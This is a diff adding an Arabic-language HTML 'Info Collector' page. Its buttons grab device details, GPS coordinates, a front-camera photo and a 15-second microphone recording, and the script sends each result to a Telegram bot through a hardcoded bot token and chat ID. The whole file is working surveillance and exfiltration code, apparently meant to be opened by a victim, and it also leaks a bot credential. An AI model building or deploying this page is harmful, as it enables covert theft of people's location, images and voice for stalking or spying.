@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Info Collector</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #0a0f1e; color: #eee; padding: 20px; text-align: center; }
+        .card { background: #1e2a3a; border-radius: 20px; padding: 15px; margin: 15px 0; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        button { background: #2ecc71; border: none; color: white; padding: 12px 20px; margin: 8px; border-radius: 30px; font-size: 16px; cursor: pointer; width: 90%; max-width: 300px; }
+        .danger { background: #e74c3c; }
+        .info { background: #3498db; }
+        .photo { background: #f39c12; }
+        #result { margin-top: 20px; font-size: 14px; background: #00000066; padding: 10px; border-radius: 15px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <h2>📱 جامع المعلومات</h2>
+    <div class="card">
+        <button class="info" onclick="sendBasicInfo()">📊 معلومات أساسية</button>
+        <button class="info" onclick="sendLocation()">📍 الموقع الجغرافي</button>
+        <button class="photo" onclick="takePhoto()">📸 تصوير صورة (أمامية)</button>
+        <button class="photo" onclick="startRecording()">🎙️ تسجيل صوت (15 ث)</button>
+        <button class="info" onclick="getApps()">📱 قائمة التطبيقات</button>
+        <button class="info" onclick="getBatteryDetail()">🔋 تفاصيل البطارية</button>
+        <button class="info" onclick="getNetworkDetail()">📶 تفاصيل الشبكة</button>
+        <button class="danger" onclick="vibrateDevice()">📳 اهتزاز</button>
+    </div>
+    <div id="result">⏳ جاهز... اضغط زراً</div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
+        const ADMIN_ID = "7328401541";
+
+        function showResult(msg, isError=false) {
+            const resDiv = document.getElementById("result");
+            resDiv.innerHTML = msg;
+            resDiv.style.color = isError ? "#ff8888" : "#aaffaa";
+            setTimeout(() => { if(resDiv.innerHTML === msg) resDiv.innerHTML = "✅ جاهز"; }, 4000);
+        }
+
+        async function sendToTelegram(text, isMarkdown=false) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams();
+            params.append("chat_id", ADMIN_ID);
+            params.append("text", text);
+            if(isMarkdown) params.append("parse_mode", "Markdown");
+            try {
+                await fetch(url, { method: "POST", body: params });
+                showResult("✓ تم الإرسال");
+                return true;
+            } catch(e) { showResult("✗ خطأ: "+e.message, true); return false; }
+        }
+
+        async function sendPhotoToTelegram(base64Data) {
+            const blob = dataURLtoBlob(base64Data);
+            const formData = new FormData();
+            formData.append("chat_id", ADMIN_ID);
+            formData.append("photo", blob, "photo.jpg");
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            try {
+                await fetch(url, { method: "POST", body: formData });
+                showResult("📸 تم إرسال الصورة");
+            } catch(e) { showResult("خطأ في إرسال الصورة", true); }
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while(n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type: mime});
+        }
+
+        async function sendBasicInfo() {
+            let info = "📊 *معلومات الجهاز*\n";
+            info += `📱 الطراز: ${navigator.userAgent.match(/Android/i) ? "Android" : "iOS/Other"}\n`;
+            info += `🌐 اللغة: ${navigator.language}\n`;
+            info += `📺 الشاشة: ${screen.width}x${screen.height}\n`;
+            info += `🕒 الوقت: ${new Date().toLocaleString()}`;
+            await sendToTelegram(info, true);
+        }
+
+        async function sendLocation() {
+            showResult("📍 جلب الموقع...");
+            if(!navigator.geolocation) { sendToTelegram("❌ الموقع غير مدعوم"); return; }
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                let loc = `📍 *الموقع*\nخط العرض: ${pos.coords.latitude}\nخط الطول: ${pos.coords.longitude}\nالدقة: ${pos.coords.accuracy}m`;
+                await sendToTelegram(loc, true);
+            }, () => { sendToTelegram("❌ رفض المستخدم الموقع"); });
+        }
+
+        async function getBatteryDetail() {
+            if(!navigator.getBattery) { sendToTelegram("🔋 معلومات البطارية غير مدعومة"); return; }
+            const battery = await navigator.getBattery();
+            let txt = `🔋 *البطارية*\nالنسبة: ${Math.round(battery.level*100)}%\nشحن: ${battery.charging ? "نعم" : "لا"}\nوقت الشحن المتبقي: ${battery.chargingTime ?? "غير معروف"}`;
+            await sendToTelegram(txt, true);
+        }
+
+        async function getNetworkDetail() {
+            const conn = navigator.connection || navigator.mozConnection;
+            if(!conn) { sendToTelegram("📶 معلومات الشبكة غير مدعومة"); return; }
+            let txt = `📶 *الشبكة*\nالنوع: ${conn.effectiveType || "?"}\nالسرعة: ${conn.downlink || "?"} Mbps\nRTT: ${conn.rtt || "?"} ms`;
+            await sendToTelegram(txt, true);
+        }
+
+        function vibrateDevice() {
+            if(navigator.vibrate) { navigator.vibrate(500); sendToTelegram("📳 اهتزاز تم بنجاح"); }
+            else sendToTelegram("❌ الاهتزاز غير مدعوم");
+        }
+
+        function getApps() {
+            // لا يمكن جلب قائمة التطبيقات من المتصفح مباشرة، نرسل رسالة توضيحية
+            sendToTelegram("📱 لا يمكن جلب قائمة التطبيقات من متصفح الهاتف. هذا يتطلب تطبيق Android حقيقي.");
+        }
+
+        // تصوير صورة باستخدام الكاميرا الأمامية
+        async function takePhoto() {
+            showResult("📸 طلب الوصول للكاميرا...");
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.getElementById("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoData = canvas.toDataURL("image/jpeg", 0.8);
+                    sendPhotoToTelegram(photoData);
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                }, 500);
+            } catch(e) {
+                sendToTelegram("❌ لا يمكن الوصول للكاميرا: "+e.message);
+            }
+        }
+
+        // تسجيل الصوت
+        let mediaRecorder;
+        let audioChunks = [];
+        async function startRecording() {
+            showResult("🎙️ سيتم التسجيل 15 ثانية...");
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                    const formData = new FormData();
+                    formData.append("chat_id", ADMIN_ID);
+                    formData.append("voice", audioBlob, "voice.ogg");
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: formData });
+                    showResult("🎙️ تم إرسال التسجيل الصوتي");
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 15000);
+            } catch(e) {
+                sendToTelegram("❌ لا يمكن الوصول للميكروفون");
+            }
+        }
+    </script>
+</body>
+</html>
